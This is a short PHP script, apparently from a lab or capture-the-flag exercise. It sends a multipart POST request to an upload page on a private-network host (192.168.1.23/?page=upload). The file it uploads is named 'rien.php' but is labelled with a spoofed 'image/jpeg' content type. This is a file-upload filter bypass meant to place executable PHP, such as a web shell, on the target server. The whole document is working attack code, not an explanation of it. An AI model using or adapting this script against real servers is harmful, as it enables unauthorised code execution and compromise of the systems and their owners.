<?php

define('MULTIPART_BOUNDARY', '--------------------------'.microtime(true));
$header = 'Content-Type: multipart/form-data; boundary='.MULTIPART_BOUNDARY;

define('FORM_FIELD', 'uploaded');

$filename = "rien.php";
$file_contents = file_get_contents($filename);    

$content =  "--".MULTIPART_BOUNDARY."\r\n".
	"Content-Disposition: form-data; name=\"".FORM_FIELD."\"; filename=\"".basename($filename)."\"\r\n".
	"Content-Type: image/jpeg\r\n\r\n".
	$file_contents."\r\n";

//add some POST fields to the request too: $_POST['foo'] = 'bar'
$content .= "--".MULTIPART_BOUNDARY."\r\n".
	"Content-Disposition: form-data; name=\"Upload\"\r\n\r\n".
	"Upload\r\n";

// signal end of request (note the trailing "--")
$content .= "--".MULTIPART_BOUNDARY."--\r\n";

$context = stream_context_create(array(
	'http' => array(
		'method' => 'POST',
		'header' => $header,
		'content' => $content,
	)
));

echo file_get_contents('http://192.168.1.23/?page=upload', false, $context);

?>
